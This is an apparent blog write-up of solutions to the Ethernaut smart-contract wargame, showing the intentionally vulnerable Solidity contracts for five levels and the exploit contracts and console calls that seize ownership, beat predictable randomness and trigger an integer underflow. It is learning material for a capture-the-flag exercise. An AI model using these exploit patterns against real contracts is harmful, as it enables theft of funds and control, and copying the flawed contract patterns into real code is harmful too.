<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【WP】Ethernaut | aYoung's Blog</title><meta name="keywords" content="ctf,wp,blockchain"><meta name="author" content="aYoung"><meta name="copyright" content="aYoung"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Hello Ethernaut略 Fallback123456789101112131415161718192021222324252627282930313233343536373839404142434445&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;@openzeppelin&#x2F;contracts&#x2F;mat">
<meta property="og:type" content="article">
<meta property="og:title" content="【WP】Ethernaut">
<meta property="og:url" content="https://iamayoung.xyz/2022/09/07/%E3%80%90WP%E3%80%91Ethernaut/index.html">
<meta property="og:site_name" content="aYoung&#39;s Blog">
<meta property="og:description" content="Hello Ethernaut略 Fallback123456789101112131415161718192021222324252627282930313233343536373839404142434445&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;@openzeppelin&#x2F;contracts&#x2F;mat">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.ax1x.com/2022/11/18/zn2XIe.png">
<meta property="article:published_time" content="2022-09-07T06:46:53.000Z">
<meta property="article:modified_time" content="2022-12-28T16:08:03.828Z">
<meta property="article:author" content="aYoung">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="blockchain">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.ax1x.com/2022/11/18/zn2XIe.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://iamayoung.xyz/2022/09/07/%E3%80%90WP%E3%80%91Ethernaut/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-12-29 00:08:03'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://s4.ax1x.com/2022/01/14/731OZF.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">83</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.ax1x.com/2022/11/18/zn2XIe.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">aYoung's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【WP】Ethernaut</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-07T06:46:53.000Z" title="发表于 2022-09-07 14:46:53">2022-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-28T16:08:03.828Z" title="更新于 2022-12-29 00:08:03">2022-12-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">18.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>81分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h1><p>略</p>
<h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>fallback</code>函数是在智能合约中是一个特殊的函数，它没有函数名，在下面情况被使用： 合约收到，或当有人调用不在合约内的函数，或参数不正确</p>
<p>这里有个小trick，Fallback不是一个fallback函数（即使函数名称是Fallback），但<code>function() payable public</code>才是fallback函数。由此我们有了下面方法：首先调用函数<code>contribute()</code>并让value小于0.001从而成为一个contributor</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&#x27;0.0001&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>
<p>检查是否已经成为contributor，result&gt;0表示已经成为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">getContribution</span>().<span class="title function_">then</span>(<span class="function"><span class="params">x</span> =&gt;</span> x.<span class="title function_">toNumber</span>())</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[[<span class="title class_">PromiseState</span>]]: <span class="string">&quot;fulfilled&quot;</span></span><br><span class="line">[[<span class="title class_">PromiseResult</span>]]: <span class="number">100000000000000</span></span><br></pre></td></tr></table></figure>
<p>发送ehter给合约激活fallback，然后我们就会成为owner</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">send</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>查看发现已经成为owner</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">owner</span>()</span><br><span class="line">...</span><br><span class="line">[[<span class="title class_">PromiseState</span>]]: <span class="string">&quot;fulfilled&quot;</span></span><br><span class="line">[[<span class="title class_">PromiseResult</span>]]: <span class="string">&quot;0x862570693111DB350a6376c095B7E57c7650E78d&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player</span><br><span class="line"><span class="string">&#x27;0x862570693111DB350a6376c095B7E57c7650E78d&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;./SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接运行函数<code>Fal1out</code>即可成为owner</p>
<h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</code>其实是$ 2^{256}/2 $，所以一个随机hash除factor的结果为0或1概率为1/2</p>
<p>随机值是根据前一个区块的hash值来计算的，所以实际上并不随机，因为在调用之前我们就能获得当前交易的上一个区块的blockhash</p>
<p>绕过的方法是自己写一个攻击合约，使用和CoinFlip中相同的算法算出一个随机数，然后用该随机数调用合约中的flip函数，这个过程会被当做一笔交易，由于一笔交易被打包在一个区块中，所以攻击合约和原合约是对相同合约做计算，提前校验结果然后再通过调用CoinFlip传入提前计算好的结果即可</p>
<p>exp如下（参考）<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;./SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exp&#123;</span><br><span class="line">    address public con_addr = 0x55bd38f201C332CcE9B0fc9502AC0495B7a5E88a;</span><br><span class="line">    // 这个地址改成合约的地址</span><br><span class="line">    CoinFlip c = CoinFlip(con_addr);</span><br><span class="line">    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">     </span><br><span class="line">    function guess() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number -1));</span><br><span class="line">        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        c.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>tx.origin</code>和<code>msg.sender</code>不同，如果从合约A调用函数，并在该函数中调用合约B的函数，那么<code>tx.origin</code>将是你的地址，而<code>msg.sender</code>会是合约A的地址</p>
<p>攻击者通过这一点利用其他合约来攻击另一个合约</p>
<p>回到本题很明显，只需要写一个合约，在其中以player地址为参数调用<code>Telephone</code>中的<code>changeOwner</code>函数，player即可成为owner</p>
<p>exp如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public player = 0x862570693111DB350a6376c095B7E57c7650E78d;</span><br><span class="line">    address public con_addr = 0xcA615bB7308B49B250AEfd4Dcc7cb1Ac31FFd003;</span><br><span class="line">    Telephone t = Telephone(con_addr);</span><br><span class="line">    function beOwner() public &#123;</span><br><span class="line">        t.changeOwner(player);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考察整数下溢，类型都是uint。初始代币20个，<code>_to</code>随便写一个地址，<code>_value</code>大于20即可造成溢出</p>
<p>exp如下，结果变为50<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address public contract_addr = 0x8Eb253EE30691E548b704Cb535ea4Ff4f6827d09;</span><br><span class="line">    address public to_addr = 0x862570693111DB350a6376c095B7E57c7650E78d;</span><br><span class="line">    uint value = 30;</span><br><span class="line">    Token t = Token(contract_addr);</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        t.transfer(to_addr, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
